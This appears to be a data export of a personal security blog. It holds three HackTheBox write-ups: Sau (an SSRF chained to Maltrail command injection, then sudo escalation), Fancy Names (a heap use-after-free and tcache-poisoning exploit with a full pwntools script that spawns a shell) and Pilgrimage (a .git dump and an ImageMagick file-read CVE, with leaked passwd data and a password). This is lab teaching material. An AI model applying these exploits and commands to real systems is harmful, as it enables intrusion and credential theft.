[{"content":"","date":"3 August 2023","permalink":"/boxes/","section":"Boxes","summary":"","title":"Boxes"},{"content":"","date":"3 August 2023","permalink":"/tags/cve/","section":"Tags","summary":"","title":"cve"},{"content":" Introduction # Sau is an easy Linux machine from HackTheBox created by user sau123.\nA fairly easy Linux machine which involves exploiting a server side request forgery to reach a vulnerable service running on the internal network. From there an unsecure command can be executed with sudo giving root access to the machine.\nInformation Gathering # Starting with a rustscan to find all the open ports on the server.\n.----. .-. .-. .----..---. .----. .---. .--. .-. .-. | {} }| { } |{ {__ {_ _}{ {__ / ___} / {} \\ | `| | | .-. \\| {_} |.-._} } | | .-._} }\\ }/ /\\ \\| |\\ | `-\u0026#39; `-\u0026#39;`-----\u0026#39;`----\u0026#39; `-\u0026#39; `----\u0026#39; `---\u0026#39; `-\u0026#39; `-\u0026#39;`-\u0026#39; `-\u0026#39; The Modern Day Port Scanner. ________________________________________ : http://discord.skerritt.blog : : https://github.com/RustScan/RustScan : -------------------------------------- Real hackers hack time ‚åõ Open 10.10.11.224:22 Open 10.10.11.224:55555 [~] Starting Script(s) [~] Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-02 17:57 EEST Initiating Ping Scan at 17:57 Scanning 10.10.11.224 [2 ports] Completed Ping Scan at 17:57, 0.13s elapsed (1 total hosts) Initiating Parallel DNS resolution of 1 host. at 17:57 Completed Parallel DNS resolution of 1 host. at 17:57, 0.00s elapsed DNS resolution of 1 IPs took 0.01s. Mode: Async [#: 3, OK: 1, NX: 0, DR: 0, SF: 0, TR: 1, CN: 0] Initiating Connect Scan at 17:57 Scanning 10.10.11.224 (10.10.11.224) [2 ports] Discovered open port 22/tcp on 10.10.11.224 Discovered open port 55555/tcp on 10.10.11.224 Completed Connect Scan at 17:57, 0.13s elapsed (2 total ports) Nmap scan report for 10.10.11.224 (10.10.11.224) Host is up, received conn-refused (0.13s latency). Scanned at 2023-08-02 17:57:52 EEST for 0s PORT STATE SERVICE REASON 22/tcp open ssh syn-ack 55555/tcp open unknown syn-ack Read data files from: /usr/local/bin/../share/nmap Nmap done: 1 IP address (1 host up) scanned in 0.29 seconds Ports 22 and 55555 are open. Port 22 is the default port for SSH. Port 55555 is definetly not standard though. Visiting this port from the browser reveals a website.\nmain webpage The website seems like it creates a dynamic basket which collects http requests. Essentially it creates a new url point which takes any http request made to it and catalogues it.\nnew basket creation Getting User Access # Going to the settings of the selected basket I can configure a url which will be used as a forward location. Also to capture the response of the forwarded request I will select the Proxy Response.\nNaturally in a case like this I will try using the local IP as a forward address to scan the internal network. As it happens there are no security mechanisms to prevent this and the request will go through, acting like the host system of the website made the request itself.\nsetting up a forward address Inspecting the response there seems to be something running on port 80 for the internal network. More specifically it is a vulnerable version of maltrail, a malicious traffic detection system.\nrendered response of forwarded request This version of maltrail is vulnerable to a command injection. I will be using this exploit found on github which is just a wrapper to using curl to send a http post request with the command injected as its data. Also I will be updating the forwarded url to include /input as this is the route that is actually vulnerable. This will turn the new forward url to http://127.0.0.1:55555/login. To get a reverse shell I set up a listener and fire up the exploit.\nlogged in as user puma executing the exploit Getting Root Access # Getting root access is very straight forward. Using the sudo -l command I can see that my user puma can execute /usr/bin/systemctl status trail.service as root.\npuma can exececute command with sudo Executing this command will drop me in a pager like less with elavated privileged. From there I can execute any command as root.\n","date":"3 August 2023","permalink":"/boxes/htb-sau/","section":"Boxes","summary":"Introduction # Sau is an easy Linux machine from HackTheBox created by user sau123.","title":"HTB Sau"},{"content":"","date":"3 August 2023","permalink":"/tags/linux/","section":"Tags","summary":"","title":"linux"},{"content":"","date":"3 August 2023","permalink":"/","section":"r4f705's blog","summary":"","title":"r4f705's blog"},{"content":"","date":"3 August 2023","permalink":"/tags/ssrf/","section":"Tags","summary":"","title":"SSRF"},{"content":"","date":"3 August 2023","permalink":"/tags/sudo/","section":"Tags","summary":"","title":"sudo"},{"content":"","date":"3 August 2023","permalink":"/tags/","section":"Tags","summary":"","title":"Tags"},{"content":"","date":"3 August 2023","permalink":"/tags/web/","section":"Tags","summary":"","title":"web"},{"content":"","date":"1 August 2023","permalink":"/binary/","section":"Binaries","summary":"","title":"Binaries"},{"content":"","date":"1 August 2023","permalink":"/tags/binary/","section":"Tags","summary":"","title":"binary"},{"content":"","date":"1 August 2023","permalink":"/tags/glib-2.27/","section":"Tags","summary":"","title":"glib 2.27"},{"content":"","date":"1 August 2023","permalink":"/tags/heap/","section":"Tags","summary":"","title":"heap"},{"content":" Introduction # Fancy Names is a pwn challenge from HackTheBox created by user w3th4nds.\nThis challenge involes taking advantage of a Use-After-Free vulnerability to poison the tcache, which will lead to executing a One Gadget through Malloc Hook. The challenge also provides the libc that the program uses which is version 2.27. This version is a bit outdated lacking newer security futures like Safe-Linking.\nThis writeup is not ment as an exhaustive resource and only focuses on giving a walkthrough on the challenge as it will not get into much detail about how the tcache works or basic binary exploitation concepts.\nStatic Analysis # Starting with some static analysis. First I will run the file command to get some general information about the binary, like the fact that it is an ELF 64-bit1 and also not stripped which will be helpful. Then I will run the checksec command to get a sense for the general protections of the binary. As it seems it has all the protections enabled!\n‚îå‚îÄ[root@8042bd2c8129]‚îÄ[/work/pwn/Fancy names/challenge] ‚îî‚îÄ‚îÄ‚ïº #file ./fancy_names clear ./fancy_names: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter ./.glibc/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=26a359d5c589d9430ec90844cc3bb34b12ab02b4, not stripped clear: cannot open `clear\u0026#39; (No such file or directory) ‚îå‚îÄ[root@8042bd2c8129]‚îÄ[/work/pwn/Fancy names/challenge] ‚îî‚îÄ‚îÄ‚ïº #checksec ./fancy_names [*] \u0026#39;/work/pwn/Fancy names/challenge/fancy_names\u0026#39; Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled RUNPATH: b\u0026#39;./.glibc/\u0026#39; ‚îå‚îÄ[root@8042bd2c8129]‚îÄ[/work/pwn/Fancy names/challenge] ‚îî‚îÄ‚îÄ‚ïº # To get to the thick of things I will fire binary ninja. I use a desktop version of the tool, but there is also a free web app which works fine for most cases. After a few minutes of looking around it seems like there are two functions of interest, main and menu.\nLooking of the BUG üêû # The main function starts after calling create_random_username and menu functions. It asks the user to select an option between Upgrade Skills which prompts the user to select a number to indicate a points value and then a string to indicate to which skill to attribute those points, Get Starter Pack which just prints some text to the terminal and Exit. From the three only Upgrade Skills seems of immediate interest because of its more dynamic nature and to be more precise because of the malloc call. Dispite that though there is no bug to exploit here!\nmain function decompilation from binary ninja [+] Welcome MarvelousNoob9044! [*] Choose actions (1/4): 1. Upgrade skills üõ°Ô∏è 2. Get starter pack üí∞ 3. Exit üèÉ \u0026gt; // part of main function code while (true) { if (var_138 \u0026lt;= 3) { fflush(stdout); var_138 = (var_138 + 1); fprintf(stdout, \u0026#34;\\n[*] Choose actions (%ld/4): \\n‚Ä¶\u0026#34;, var_138); fflush(stdout); uint64_t rax_6 = read_num(); if (rax_6 == 1) { fwrite(\u0026#34;\\n[*] Stat points (max 120 per t‚Ä¶\u0026#34;, 1, 0x25, stdout); fflush(stdout); uint64_t rax_8 = read_num(); int64_t rax_10 = malloc(rax_8); if (rax_10 == 0) { break; } fwrite(\u0026#34;\\n[*] Stat (e.g. Health, Strengt‚Ä¶\u0026#34;, 1, 0x36, stdout); fflush(stdout); read(0, rax_10, (rax_8 + 8)); fprintf(stdout, \u0026#34;%s\\n[+] Stat points added!\\n%s\\n\u0026#34;, \u0026#34;\\x1b[1;32m\u0026#34;, \u0026#34;\\x1b[1;34m\u0026#34;); fflush(stdout); continue; } else if (rax_6 == 2) { fprintf(stdout, \u0026#34;\\n%s[+] Starter pack contains: \\n‚Ä¶\u0026#34;, \u0026#34;\\x1b[1;32m\u0026#34;, \u0026#34;\\x1b[1;34m\u0026#34;); continue; } } exit(0x45); /* no return */ } Moving to the menu function things get much more interesting. The menu function not unlike main presents four options to the user. Custom name to select a user provided name for the program to use, Reroll name which will pick three random usernames from a list, Continue that will exit the menu function to continue execution on main and finaly exit that terminates the program.\n[*] Welcome friend, your default username is: MarvelousNoob9044 [!] You can only change name twice! One custom and one suggested. Choose wisely! ********************* * * * [1] Custom name * * [2] Reroll name * * [3] Continue * * [4] Exit * * * ********************* \u0026gt; The first bug I notice occurs when selecting the Custom name option. The code will store the user input in the tmp_username variable which has no buffer size preset which means that the compiler will produce an executable that does not allocate enough space for it in the stack. This coupled with the fact that it is used in the fprintf function as well as how C-strings work can result in sensitive information like pointers leaking. This will be essential for an exploit to work because both ASLR and PIE are enabled and this means that addresses in the binary will be randomised on every run.\nfflush(stdout); fwrite(\u0026#34;\\n[*] Insert new name (minimum 5‚Ä¶\u0026#34;, 1, 0x28, stdout); fflush(stdout); void tmp_username; int32_t rax_7 = read(0, \u0026amp;tmp_username, 0x63); fflush(stdout); fprintf(stdout, \u0026#34;\\n[*] Are you sure you want to u‚Ä¶\u0026#34;, \u0026amp;tmp_username); fflush(stdout); Another thing I notice is that at the beginning of menu there are two malloc(0x64) calls that will make space in the heap. Both allocations will be initially used to store the current username. As it seems though only the second allocation will ever actually be used for something. The only time the first allocation is touched again is by the free function and this will come really handy later because for for the exploit I will be doing two free chunks are nessesary.\nchar* never_used_allocation = malloc(0x64); strcpy(never_used_allocation, current_username); char* new_username = malloc(0x64); strcpy(new_username, current_username); The second bug, and the one that spells PWNED for this program comes from the fact that during the Reroll name function the program frees the new_username pointer but dispite that it nevers clears the reference or renews it with a new malloc call. This practically means that the program will write to a location that now holds very sensitive metadata used by tcache when saving the custom username that the user inputs, giving me control of tcache. This exploit technique is called tcache poisoning, here is a good POC. As an attacker I will use this to get write access to any address in the binary I want. The location of choice will be __malloc_hook which is part of libc.\n// free new_username during Reroll name option uint64_t user_input = read_num(); if (var_290 == 1) { fprintf(stdout, \u0026#34;%s\\n[-] Cannot change username a‚Ä¶\u0026#34;, \u0026#34;\\x1b[1;31m\u0026#34;, \u0026#34;\\x1b[1;34m\u0026#34;); } else { free(new_username); // Initial free happens here fprintf(stdout, \u0026#34;\\n%s[!] Name has been deleted!\\n‚Ä¶\u0026#34;, \u0026#34;\\x1b[1;32m\u0026#34;, \u0026#34;\\x1b[1;34m\u0026#34;); create_random_username(\u0026amp;var_268); sleep(1); srand(time(nullptr)); ... // later using the freed new_username if (var_26b != 0x79) { memset(\u0026amp;tmp_username, 0, 0x100); fprintf(stdout, \u0026#34;%s\\n[*] Name has not been change‚Ä¶\u0026#34;, \u0026#34;\\x1b[1;35m\u0026#34;, \u0026#34;\\x1b[1;34m\u0026#34;); } else if (rax_8 \u0026lt;= 5) { fprintf(stdout, \u0026#34;%s\\n[-] Invalid name!\\n%s\u0026#34;, \u0026#34;\\x1b[1;31m\u0026#34;, \u0026#34;\\x1b[1;34m\u0026#34;); memset(\u0026amp;tmp_username, 0, ((int64_t)rax_8)); } else { var_298 = 2; var_2a0 = (var_2a0 + 1); strcpy(new_username, \u0026amp;tmp_username); // Copy tmp_username to freed pointer new_username new_username[(strlen(new_username) - 1)] = 0; char const* const rax_20; if (strcmp(new_username, \u0026#34;wisely\u0026#34;) != 0) { rax_20 = \u0026amp;data_2a33; } else { rax_20 = \u0026#34;\\n%s[-.-] Very funny.. 10 points‚Ä¶\u0026#34;; } fprintf(stdout, rax_20, \u0026#34;\\x1b[1;31m\u0026#34;, \u0026#34;\\x1b[1;34m\u0026#34;); fprintf(stdout, \u0026#34;\\n[!] New name: %s%s%s\\n\u0026#34;, \u0026#34;\\x1b[1;32m\u0026#34;, new_username, \u0026#34;\\x1b[1;34m\u0026#34;); memset(\u0026amp;tmp_username, 0, 0x100); } ... Dynamic Analysis # As it was mentioned before in order for the exploit to work I need to utilize the leak vulnerability. Using gdb and setting a break point just before saving the user input to the stack I can inspect its contents to see what information can be leaked.\nAs can be seen in the bottom of the image below the stack has room for only 15 bytes before it starts leaking information. The first 8 bytes hold the current value for username and then there are 8 more bytes of free space. After that though it has a PIE address and a stack address. Both could be useful in some other senario but in this one a libc address is needed.\nLuckily enough there is a libc address within reach 56 bytes (I can write up to 100 bytes) from the start of the writing buffer. If I send for example 56 As as input fprintf will create a string that also includes the libc address, because no \\x00 bytes will be present before it to stop it, and fflush will output this sting making available for use.\nstack just before storing the custom name That is everything needed to create a working exploit that results in remote command execution!\nWritting an Expoit # Based on the results the binary analysis an exploit can be created. This exploit will involve the following steps:\nMake two allocations of 100 bytes (0x64) using malloc just by going to the menu function (happens naturally by the program flow). Leak libc address by sending 56 bytes through the custom name option. It also makes the first free call. Using libc leak calculate the location libc is loaded in the binary. It minus 0x64e1c bytes from the leaked address. Use libc base location to calculate address of __malloc_hook. This will be the location I want to write to. It holds the pointer to a function that runs everytime malloc is called. Use libc base location to calculate address of magic gadget2, which will be stored in __malloc_hook. To find one gadgets in the program\u0026rsquo;s libc this tool can be used. Create the dangling pointer (second free) by selecting the reroll name option. Store the __malloc_hook pointer to the dangling pointer. Malloc twice 100 (0x64) bytes through the stats points function (which is a part of main as seen in the code snippet at the beginning) to gain write access to the __malloc_hook address. More specifically the second allocation will take the poluted tcahce entry which points to __malloc_hook, giving me arbitary write to it. Write the magic gadget2 to __malloc_hook location. Use the stats points function from main again but this time when malloc is naturally called it will proc __malloc_hook that invokes the magic gadget2 and an interactive shell will pop giving command execution. remote command execution on server Below is the code for the exploit:\n#!/usr/bin/python3 from pwn import * def create_dangling_free_pointer(p): p.recvuntil(b\u0026#34;*********************\u0026#34;) p.recvuntil(b\u0026#34;*********************\u0026#34;) p.sendline(b\u0026#34;2\u0026#34;) p.recvuntil(b\u0026#34;3. \u0026#34;) p.recvline() # Send a non valid option so that nothing will be written to # the address location. This will allow for putting in # a address later for the arbitary write p.sendline(b\u0026#34;4\u0026#34;) def leak_address(p, padding_size): # Send line to select custom name p.sendline(b\u0026#34;1\u0026#34;) # Send custom name p.recvuntil(b\u0026#34;[*] Insert new name (minimum 5 chars):\u0026#34;) p.sendline(b\u0026#34;A\u0026#34; * (padding_size - 1)) p.recvuntil(b\u0026#34;name \u0026#34;) p.recv(padding_size) leaked_addr = u64(p.recv(6).ljust(8, b\u0026#34;\\x00\u0026#34;)) print(\u0026#34;Leaked stack addr:\u0026#34;, hex(leaked_addr)) p.sendline(b\u0026#34;n\u0026#34;) return leaked_addr def save_write_addr(p, write_addr): # Send line to select custom name p.recvuntil(b\u0026#34;*********************\u0026#34;) p.recvuntil(b\u0026#34;*********************\u0026#34;) p.sendline(b\u0026#34;1\u0026#34;) # Send custom name p.recvuntil(b\u0026#34;[*] Insert new name (minimum 5 chars): \u0026#34;) p.sendline(write_addr) p.recvuntil(b\u0026#34;(y/n): \u0026#34;) p.sendline(b\u0026#34;y\u0026#34;) def write(p, payload): # Send line to select custom name p.recvuntil(b\u0026#34;*********************\u0026#34;) p.recvuntil(b\u0026#34;*********************\u0026#34;) p.sendline(b\u0026#34;3\u0026#34;) for i in range(2): p.recvuntil(b\u0026#34;Upgrade skills\u0026#34;) p.sendline(b\u0026#34;1\u0026#34;) p.recvuntil(b\u0026#34;Stat points (max 120 per time):\u0026#34;) p.sendline(b\u0026#34;100\u0026#34;) p.recvuntil(b\u0026#34;Stat (e.g. Health, Strength, Agility or Custom): \u0026#34;) if i == 0: p.sendline(b\u0026#34;Custom\u0026#34;) else: p.sendline(payload) def pwn(p): p.recvuntil(b\u0026#34;Upgrade skills\u0026#34;) p.sendline(b\u0026#34;1\u0026#34;) p.recvuntil(b\u0026#34;Stat points (max 120 per time):\u0026#34;) p.sendline(b\u0026#34;100\u0026#34;) if __name__ == \u0026#34;__main__\u0026#34;: # context.log_level = \u0026#34;DEBUG\u0026#34; context(arch=\u0026#39;amd64\u0026#39;, os=\u0026#39;linux\u0026#39;) p = remote(\u0026#34;167.172.62.51\u0026#34;, 32652) libc = ELF(\u0026#34;./.glibc/libc.so.6\u0026#34;) # First Leak leaked_libc_addr = leak_address(p, 8 * 7) print(\u0026#34;Leaked libc addr:\u0026#34;, hex(leaked_libc_addr)) libc_base = leaked_libc_addr - 0x64eb0 - 0x94 libc.address = libc_base malloc_hook_addr = libc.symbols[\u0026#34;__malloc_hook\u0026#34;] print(\u0026#34;Libc base:\u0026#34;, hex(libc_base)) print(\u0026#34;Malloc hook address:\u0026#34;, hex(malloc_hook_addr)) input(\u0026#34;Continue...\u0026#34;) print(\u0026#34;Creating a dangling pointer\u0026#34;) # Then create dangling free pointer create_dangling_free_pointer(p) input(\u0026#34;Continue...\u0026#34;) # Then put adritary write address print(\u0026#34;Allocate to arbitary memory\u0026#34;) save_write_addr(p, p64(malloc_hook_addr)[:-2]) input(\u0026#34;Continue...\u0026#34;) print(\u0026#34;Writing payload\u0026#34;) payload = p64(libc_base + 0x4f432) # execve(\u0026#34;/bin/sh\u0026#34;, rsp+0x40, environ) write(p, payload) # Malloc once more for the hook to fire pwn(p) p.interactive() ELF binaries are compiled for Linux, DWARF for Windows and Mach-O for MacOS.\u0026#160;\u0026#x21a9;\u0026#xfe0e;\nMagic Gadgets or One Gadgets are simply a pointer to execve(\u0026quot;/bin/sh\u0026quot;) in libc. If available they can be very powerful because they remove the need to construct a regular ROP chain.\u0026#160;\u0026#x21a9;\u0026#xfe0e;\u0026#160;\u0026#x21a9;\u0026#xfe0e;\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n","date":"1 August 2023","permalink":"/binary/htb-fancy-names/","section":"Binaries","summary":"Introduction # Fancy Names is a pwn challenge from HackTheBox created by user w3th4nds.","title":"HTB Fancy Names"},{"content":"","date":"1 August 2023","permalink":"/tags/pwn/","section":"Tags","summary":"","title":"pwn"},{"content":"","date":"1 August 2023","permalink":"/tags/tcache/","section":"Tags","summary":"","title":"tcache"},{"content":" Introduction # Pilgrimage is a machine by HackTheBox created by user coopertim13.\nGetting root in this machine involves exploiting two CVEs1. An ImageMagick CVE-2022-44268 which is used to gain access to user emily and a binwalk CVE-2022-4510 which is used to get access as root.\nInformation Gathering # Like all HTB machines the first step is to run a network scan to find any open ports. For this task I used rustscan.\n.----. .-. .-. .----..---. .----. .---. .--. .-. .-. | {} }| { } |{ {__ {_ _}{ {__ / ___} / {} \\ | `| | | .-. \\| {_} |.-._} } | | .-._} }\\ }/ /\\ \\| |\\ | `-\u0026#39; `-\u0026#39;`-----\u0026#39;`----\u0026#39; `-\u0026#39; `----\u0026#39; `---\u0026#39; `-\u0026#39; `-\u0026#39;`-\u0026#39; `-\u0026#39; The Modern Day Port Scanner. ________________________________________ : http://discord.skerritt.blog : : https://github.com/RustScan/RustScan : -------------------------------------- Please contribute more quotes to our GitHub https://github.com/rustscan/rustscan [~] The config file is expected to be at \u0026#34;/Users/raftos/.rustscan.toml\u0026#34; [!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers [!] Your file limit is very small, which negatively impacts RustScan\u0026#39;s speed. Use the Docker image, or up the Ulimit with \u0026#39;--ulimit 5000\u0026#39;. Open 10.10.11.219:22 Open 10.10.11.219:80 The open ports indicate a web server at port 80 and the ssl server running at port 22, pretty typical for a machine like this.\nVisiting port 80 through a web browser we get redirected to pilgrimage.htb so lets add this to our hosts file. This will allow us to visit the website using this url from now on.\necho 10.10.11.219 pilgrimage.htb \u0026gt;\u0026gt; /etc/hosts Website homepage The main attraction of the website is an upload form that takes an image from the user and shrinks it allowing him them to download it from the web server. Using some meta hacking üòé (experience with CTF) I am pretty sure I am dealing with some kind of file upload attack.\nBut before I continue I set up a file scan on the webserver to see if I can find anything juicy.\ngobuster dir -u http://pilgrimage.htb/ -w /opt/SecLists/Discovery/Web-Content/raft-medium-files-lowercase.txt =============================================================== Starting gobuster in directory enumeration mode =============================================================== /register.php (Status: 200) [Size: 6173] /index.php (Status: 200) [Size: 7621] /login.php (Status: 200) [Size: 6166] /logout.php (Status: 302) [Size: 0] [--\u0026gt; /] /.htaccess (Status: 403) [Size: 153] /. (Status: 200) [Size: 7621] /.html (Status: 403) [Size: 153] /dashboard.php (Status: 302) [Size: 0] [--\u0026gt; /login.php] /.htpasswd (Status: 403) [Size: 153] /.htm (Status: 403) [Size: 153] /.git (Status: 301) [Size: 169] [--\u0026gt; http://pilgrimage.htb/.git/] /.htpasswds (Status: 403) [Size: 153] /.htgroup (Status: 403) [Size: 153] As it seems by the output of gobuster I am dealing with a php application, which ties well with file upload vulnerabilites, but there is also a .git repository publicly available from the webserver. This is like finding a tresure chest üíéüíéüíé\nGetting a Foothold # To get to the tresure I need a shovel. Using GitTools I will dump the .git repository to my attack machine and then exract from it all of its contents for further analysis.\nmkdir ./dump /opt/GitTools/Dumper/gitdumper.sh http://pilgrimage.htb/.git/ ./dump /opt/GitTools/Extractor/extractor.sh ./dump/.git ./dump/website Taking a look inside the extracted documents it is plain to see that this is the code for the web application running on port 80.\ntotal 53912 drwxr-xr-x 11 raftos staff 352 Jul 25 20:41 . drwxr-xr-x 4 raftos staff 128 Jul 23 22:54 .. drwxr-xr-x 7 raftos staff 224 Jul 24 23:34 assets -rw-r--r-- 1 raftos staff 205 Jul 23 22:53 commit-meta.txt -rw-r--r-- 1 raftos staff 5538 Jul 23 22:53 dashboard.php -rw-r--r-- 1 raftos staff 9430 Jul 24 23:26 index.php -rw-r--r-- 1 raftos staff 6822 Jul 23 22:53 login.php -rw-r--r-- 1 raftos staff 98 Jul 23 22:53 logout.php -rw-r--r-- 1 raftos staff 27555008 Jul 23 22:53 magick -rw-r--r-- 1 raftos staff 6836 Jul 23 22:53 register.php drwxr-xr-x 4 raftos staff 128 Jul 23 22:53 vendor After looking around for a bit it is evident that the most interesting file is index.php as it is the file that contains the image shrinking logic.\nif ($_SERVER[\u0026#39;REQUEST_METHOD\u0026#39;] === \u0026#39;POST\u0026#39;) { $image = new Bulletproof\\Image($_FILES); if($image[\u0026#34;toConvert\u0026#34;]) { $image-\u0026gt;setLocation(\u0026#34;/var/www/pilgrimage.htb/tmp\u0026#34;); $image-\u0026gt;setSize(100, 4000000); $image-\u0026gt;setMime(array(\u0026#39;png\u0026#39;,\u0026#39;jpeg\u0026#39;)); $upload = $image-\u0026gt;upload(); if($upload) { $mime = \u0026#34;.png\u0026#34;; $imagePath = $upload-\u0026gt;getFullPath(); if(mime_content_type($imagePath) === \u0026#34;image/jpeg\u0026#34;) { $mime = \u0026#34;.jpeg\u0026#34;; } $newname = uniqid(); exec(\u0026#34;/var/www/pilgrimage.htb/magick convert /var/www/pilgrimage.htb/tmp/\u0026#34; . $upload-\u0026gt;getName() . $mime . \u0026#34; -resize 50% /var/www/pilgrimage.htb/shrunk/\u0026#34; . $newname . $mime); unlink($upload-\u0026gt;getFullPath()); $upload_path = \u0026#34;http://pilgrimage.htb/shrunk/\u0026#34; . $newname . $mime; if(isset($_SESSION[\u0026#39;user\u0026#39;])) { $db = new PDO(\u0026#39;sqlite:/var/db/pilgrimage\u0026#39;); $stmt = $db-\u0026gt;prepare(\u0026#34;INSERT INTO `images` (url,original,username) VALUES (?,?,?)\u0026#34;); $stmt-\u0026gt;execute(array($upload_path,$_FILES[\u0026#34;toConvert\u0026#34;][\u0026#34;name\u0026#34;],$_SESSION[\u0026#39;user\u0026#39;])); } header(\u0026#34;Location: /?message=\u0026#34; . $upload_path . \u0026#34;\u0026amp;status=success\u0026#34;); } else { header(\u0026#34;Location: /?message=Image shrink failed\u0026amp;status=fail\u0026#34;); } } else { header(\u0026#34;Location: /?message=Image shrink failed\u0026amp;status=fail\u0026#34;); } } The first thing I noticed is the ever suspicious exec function. My first instict is to try for some command injection but upon closer inspection of the code it is clear that no variable passed as a string in the command to be executed is actually user controled, so an injection type attack is ruled out.\nThe next thing I notice is that the application uses the magick (ImageMagick) binary for doing the actual shriking of the image. ImageMagick is a very popular software for doing image maniputation tasks but is also a very common attack vector with hundreds of CVEs tied to it. After finding out the version and the way it is used by the index.php document it seems like I can use this POC for CVE-2022-44268 to create a malicious image. That when uploaded to the server can read the contents of arbitary files and store it as metadata inside the image.\nThe software of the POC uses rust to construct the malicious image. After the image is created all I need to do is upload it to the web application, let the server\u0026rsquo;s magick binary process it and when ready download it through the web application but now shrinked AND with my request data inside.\ngenerate-payload \u0026#34;/etc/passwd\u0026#34; After the site has proccesed the malicious image I can download it using the link provided. Using my local version of magick to inspect the metadata of the image that I downloaded from the server. I can see the contents of the /etc/passwd file included in the Raw profile type section as hex.\nmagick identify -verbose images/passwd.png Image: Filename: images/passwd.png Permissions: rw-r--r-- Format: PNG (Portable Network Graphics) Mime type: image/png Class: PseudoClass ... Raw profile type: 1437 726f6f743a783a303a303a726f6f743a2f726f6f743a2f62696e2f626173680a6461656d 6f6e3a783a313a313a6461656d6f6e3a2f7573722f7362696e3a2f7573722f7362696e2f 6e6f6c6f67696e0a62696e3a783a323a323a62696e3a2f62696e3a2f7573722f7362696e 2f6e6f6c6f67696e0a7379733a783a333a333a7379733a2f6465763a2f7573722f736269 6e2f6e6f6c6f67696e0a73796e633a783a343a36353533343a73796e633a2f62696e3a2f 62696e2f73796e630a67616d65733a783a353a36303a67616d65733a2f7573722f67616d 65733a2f7573722f7362696e2f6e6f6c6f67696e0a6d616e3a783a363a31323a6d616e3a 2f7661722f63616368652f6d616e3a2f7573722f7362696e2f6e6f6c6f67696e0a6c703a 783a373a373a6c703a2f7661722f73706f6f6c2f6c70643a2f7573722f7362696e2f6e6f 6c6f67696e0a6d61696c3a783a383a383a6d61696c3a2f7661722f6d61696c3a2f757372 2f7362696e2f6e6f6c6f67696e0a6e6577733a783a393a393a6e6577733a2f7661722f73 706f6f6c2f6e6577733a2f7573722f7362696e2f6e6f6c6f67696e0a757563703a783a31 303a31303a757563703a2f7661722f73706f6f6c2f757563703a2f7573722f7362696e2f 6e6f6c6f67696e0a70726f78793a783a31333a31333a70726f78793a2f62696e3a2f7573 722f7362696e2f6e6f6c6f67696e0a7777772d646174613a783a33333a33333a7777772d 646174613a2f7661722f7777773a2f7573722f7362696e2f6e6f6c6f67696e0a6261636b 75703a783a33343a33343a6261636b75703a2f7661722f6261636b7570733a2f7573722f 7362696e2f6e6f6c6f67696e0a6c6973743a783a33383a33383a4d61696c696e67204c69 7374204d616e616765723a2f7661722f6c6973743a2f7573722f7362696e2f6e6f6c6f67 696e0a6972633a783a33393a33393a697263643a2f72756e2f697263643a2f7573722f73 62696e2f6e6f6c6f67696e0a676e6174733a783a34313a34313a476e617473204275672d 5265706f7274696e672053797374656d202861646d696e293a2f7661722f6c69622f676e 6174733a2f7573722f7362696e2f6e6f6c6f67696e0a6e6f626f64793a783a3635353334 3a36353533343a6e6f626f64793a2f6e6f6e6578697374656e743a2f7573722f7362696e 2f6e6f6c6f67696e0a5f6170743a783a3130303a36353533343a3a2f6e6f6e6578697374 656e743a2f7573722f7362696e2f6e6f6c6f67696e0a73797374656d642d6e6574776f72 6b3a783a3130313a3130323a73797374656d64204e6574776f726b204d616e6167656d65 6e742c2c2c3a2f72756e2f73797374656d643a2f7573722f7362696e2f6e6f6c6f67696e 0a73797374656d642d7265736f6c76653a783a3130323a3130333a73797374656d642052 65736f6c7665722c2c2c3a2f72756e2f73797374656d643a2f7573722f7362696e2f6e6f 6c6f67696e0a6d6573736167656275733a783a3130333a3130393a3a2f6e6f6e65786973 74656e743a2f7573722f7362696e2f6e6f6c6f67696e0a73797374656d642d74696d6573 796e633a783a3130343a3131303a73797374656d642054696d652053796e6368726f6e69 7a6174696f6e2c2c2c3a2f72756e2f73797374656d643a2f7573722f7362696e2f6e6f6c 6f67696e0a656d696c793a783a313030303a313030303a656d696c792c2c2c3a2f686f6d 652f656d696c793a2f62696e2f626173680a73797374656d642d636f726564756d703a78 3a3939393a3939393a73797374656d6420436f72652044756d7065723a2f3a2f7573722f 7362696e2f6e6f6c6f67696e0a737368643a783a3130353a36353533343a3a2f72756e2f 737368643a2f7573722f7362696e2f6e6f6c6f67696e0a5f6c617572656c3a783a393938 3a3939383a3a2f7661722f6c6f672f6c617572656c3a2f62696e2f66616c73650a ... With the help of a small script I can decode and read the content. We can see the root user, the www-data user which is probably the one running the web appliaction and also the user emily.\nimport sys import subprocess if len(sys.argv) \u0026lt; 2: print(\u0026#34;Leaked image path\u0026#34;) exit() filepath = sys.argv[1] p = subprocess.run(f\u0026#34;magick identify -verbose {filepath}\u0026#34;, shell=True, check=True, capture_output=True) out = p.stdout.decode() err = p.stderr.decode() start = out.index(\u0026#34;Raw profile type:\u0026#34;) end = out.index(\u0026#34;signature\u0026#34;) profile_substring = out[start+17:end] for i in range(1000): try: print(bytes.fromhex(profile_substring[i:])) break except Exception as e: pass root‚ùå0:0:root:/root:/bin/bash daemon‚ùå1:1:daemon:/usr/sbin:/usr/sbin/nologin ... www-data‚ùå33:33:www-data:/var/www:/usr/sbin/nologin ... emily‚ùå1000:1000:emily,,,:/home/emily:/bin/bash ... Using the arbitary read exploit I try for some time to get anything useful out of the server in order to gain entry but with no luck. Finaly I remembered the sqlite file which can be seen in index.php, maybe it contains something that I can use.\nIndeed using the exploit to read the /var/db/pilgrimage and inspecting its contents there is something interesting. Something that appears like a password.\n# snippet from the output \\x18\\x01\\x03\\x17-emilyabigchonkyboi123 Using abigchonkyboi123 as emily\u0026rsquo;s password with ssh logs me in and I can also get the user flag.\nPrivilege Escalation # As the user emily I can take a look around the server from the inside. A tool I use for almost all privilege escalation senarios in CTFs is pspy. It allows for snooping running processes in a linux server without need for root permissions. I use scp to upload it to the target machine.\nscp /opt/pspy64 emily@10.10.11.219:/tmp/pspy64 Letting the tool run a few minutes and messing around with the application I notice that when uploading an image through the web application the script /usr/sbin/malwarescan.sh runs.\nLogs from pspy during an image upload #!/bin/bash blacklist=(\u0026#34;Executable script\u0026#34; \u0026#34;Microsoft executable\u0026#34;) 